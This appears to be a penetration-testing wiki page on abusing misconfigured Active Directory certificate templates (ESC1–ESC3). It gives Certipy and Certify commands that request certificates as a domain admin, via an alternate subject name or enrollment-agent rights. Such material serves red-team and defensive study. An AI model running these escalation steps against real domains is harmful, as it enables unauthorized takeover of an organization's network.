# Certificate templates

## Theory

> AD CS Enterprise CAs issue certificates with settings defined by AD objects known as certificate templates. These templates are collections of enrollment policies and predefined certificate settings and contain things like “_How long is this certificate valid for?_”, _“What is the certificate used for?”,_ “_How is the subject specified?_”, _“Who is allowed to request a certificate?”_, and a myriad of other settings
>
> \[...]
>
> There is a specific set of settings for certificate templates that makes them extremely vulnerable. As in regular-domain-user-to-domain-admin vulnerable.
>
> ([specterops.io](https://posts.specterops.io/certified-pre-owned-d95910965cd2))

In [their research papers](https://posts.specterops.io/certified-pre-owned-d95910965cd2), [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin\_) found multiple vectors of domain escalation based on certificate template misconfigurations (dubbed [ESC1](https://posts.specterops.io/certified-pre-owned-d95910965cd2#180f), [ESC2](https://posts.specterops.io/certified-pre-owned-d95910965cd2#dfa4) and [ESC3](https://posts.specterops.io/certified-pre-owned-d95910965cd2#c08e)).

![Vulnerable configurations for ESC1, ESC2 and ESC3](../../../.gitbook/assets/ad-cs\_cert\_templates\_vuln\_confs.png)

## Practice

### Template allows SAN (ESC1)

When a certificate template allows to specify a `subjectAltName`, it is possible to request a certificate for another user. It can be used for privileges escalation if the EKU specifies `Client Authentication` or `ANY`.

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC1 and ESC2 scenarios. It is possible to output the result in an archive that can be uploaded in Bloodhound.

```python
certipy find 'domain.local'/'user':'password'@'domaincontroller' -bloodhound
```

{% hint style="info" %}
Certipy's auto mode can also be used to automatically find and abuse misconfigured certificate temp
{% endhint %}

Once a vulnerable template is found, a request shall be made to obtain a certificate.

```python
certipy req 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -template 'vulnerable template' -alt 'domain admin'
```

The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used.

```batch
# Find vulnerable/abusable certificate templates using default low-privileged group
Certify.exe find /vulnerable

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
Certify.exe find /vulnerable /currentuser
```

Once a vulnerable template is found, a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).

```batch
Certify.exe request /ca:'domain\ca' /template:"Vulnerable template" /altname:"admin"
```

The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
{% endtab %}
{% endtabs %}

### Any purpose EKU (ESC2)

When a certificate template specifies the **Any Purpose** EKU, or no EKU at all, the certificate can be used for anything. ESC2 can't be abused like ESC1 if the requester can't specify a SAN, however, it can be abused like ESC3 to use the certificate as requirement to request another one on behalf of any user.

### Certificate Agent EKU (ESC3)

When a certificate template specifies the **Certificate Request Agent** EKU, it is possible to use the issued certificate from this template to request another certificate on behalf of any user.

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC3 scenario. It is possible to output the result in an archive that can be uploaded in Bloodhound.

```python
certipy find 'domain.local'/'user':'password'@'domain_controller' -bloodhound
```

Once a vulnerable template is found, a request shall be made to obtain a certificate specifying the **Certificate Request Agent** EKU.

```python
certipy req 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -template 'vulnerable template'
```

Then, the issued certificate can be used to request another certificate permitting `Client Authentication` on behalf of another user.

```python
certipy req 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -template 'User' -on-behalf-of 'domain\domain admin' -pfx 'user.pfx'
```

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used.

```batch
# Find vulnerable/abusable certificate templates using default low-privileged group
Certify.exe find /vulnerable

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
Certify.exe find /vulnerable /currentuser
```

Once a vulnerable template is found, a request shall be made to obtain a certificate specifying the **Certificate Request Agent** EKU.

```batch
Certify.exe request /ca:'domain\ca' /template:"Vulnerable template"
```

Then, the issued certificate can be used to request another certificate permitting `Client Authentication` on behalf of another user.

```batch
Certify.exe request /ca:'domain\ca' /template:"User" /onbehalfon:DOMAIN\Admin /enrollcert:enrollmentAgentCert.pfx /enrollcertpw:Passw0rd!
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://posts.specterops.io/certified-pre-owned-d95910965cd2" %}

{% embed url="https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6" %}
